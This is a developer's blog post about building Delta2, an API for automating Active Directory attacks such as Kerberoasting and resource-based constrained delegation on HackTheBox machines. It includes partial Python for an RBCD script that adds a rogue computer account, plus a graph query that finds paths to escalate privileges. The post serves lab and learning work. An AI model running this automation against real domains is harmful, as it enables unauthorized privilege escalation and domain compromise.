+++
title = "Delta2"
date = "2024-11-10T16:56:20-07:00"
author = "Ceald"
authorTwitter = "" #do not include @
cover = ""
tags = ["delta2", "new", "cybersecurity", "projects", "python"]
keywords = ["projects", "delta2", "python"]
description = ""
showFullContent = false
readingTime = false
hideComments = false
+++

## Background
Delta2 is an API that is a Swiss army knife for active directory. I wrote this project because I was sick of having to set up java and remembering how to use bloodhound python for doing active directory boxes on HackTheBox, so I wrote my own. Delta2's primary use is automation like automate kerberosing after mapping the domain or getting shortest paths to admin users and exploiting the necessary users to get to admin users.

Delta2 was my first successful full-stack application and took many months to build. It uses Memgraph which is an alternative to Neo4j as the graphing database and FastAPI for the API, and it's containerized with docker for easy deployment.


## Process of building
### Plan
My plan was to build some kind of script or API that will allow me to move through a domain efficiently. There were a few ways I could've done that like using bloodhound and neo4j to find paths in the graph, but that'd require me to read documentation and code that I didn't write. My second option was to "reinvent the wheel" which is what I did. Unfortunately I thought it'd be the easiest way which it probably wasn't, but I learned more than if I were to just make it based off of bloodhound.

### The Beginning
After I kind of had a plan I started building it. I built an outline for the API with various routes I wanted like Kerberoasting, getting TGTs, AS-REP roasting, and a collection script. Testing was a bit of a pain because I would use boxes from HackTheBox, and sometimes I forgot to take out test code and I would have to take the repository down, remove the test code then put it back up to avoid spoilers for boxes. 

### Collection Script Works
One big issue with building the collection script was supporting Kerberos and reading nTSecurityDescriptors. nTSecurityDescriptors describe what objects and permissions a user has over another for example: Bob has WriteAll on Administrator. I first realized the issue with Kerberos when I couldn't get ldap3 and impacket to work together like how they work in bloodhound python so I switched to BloodyAD which is an Active Directory privilege escalation framework. So I reverse engineered BloodyAD to figure out how to use it because there's no documentation for how to use its python modules and got it kind of working. I say kind of because now I had to learn how to read nTSecurityDescriptors. You can find how I learned the syntax for nTSecurityDescriptors here:


https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/


Writing the collection script is what took the longest time because I also had to do a little reverse engineering on how bloodhound python worked and do a bunch of debugging to figure out what information and how to commit it to the graph as well as how to connect nodes. After collecting nodes next was to graph and link them that's where I read and parsed SnTSecurityDescriptors. No python modules supported it, so I had to do it manually.



### Examples
After getting the collection script working next was to write some examples for how to use the graph data and the other endpoints of the API.

Some examples I built included a kerberoasting script and a RBCD (Resource Based Constrained Delegation) attack script. Some code snippets for the RBCD script:
```python
def run(user, password, hash_, aeskey, delegate_to):
  comp_name = 'randomcomputer550'
  comp_pass = 'Password123!'
  j = {
    "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": user,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": password,
      "user_hash": hash_,
      "aeskey": aeskey
    },
    "ops": {
      "option": "add_computer",
      "computer_name": comp_name,
      "computer_pass": comp_pass,
      "ou": "",
      "contianer": ""
    }
  }

  response = req.post('http://localhost:9000/ldap/objeditor', json=j).json()
  print(response)

  if "error" in response['response'] and "entryAlreadyExists" not in response['response']:
      raise Custom_exception(message=response['response'])


  j = {
    "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": user,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": password,
      "user_hash": hash_,
      "aeskey": aeskey
    }
  }
```
The script would add a new computer to the domain and then modify its permissions to have control over an object it can delegate to like the administrator user. All of it is automated by the script running a query to get possible RBCD paths to users. The query:
```sql
MATCH path1=(n {t: "user"})-[ *ALLSHORTEST (r, n | 1)]->(m)
WHERE m.disabled IS NULL AND m.t = "computer"
  AND n.disabled IS NULL 
  AND n.pwned = "True" 
  AND m.pwned IS NULL 
  AND m.added_comp IS NULL 
  AND NOT m.name = 'randomcomputer550$'
  AND ALL(rel IN relationships(path1) WHERE type(rel) IN ["memberOf", "GENERIC_ALL"])
  AND size(relationships(path1)) > 0
RETURN path1
```
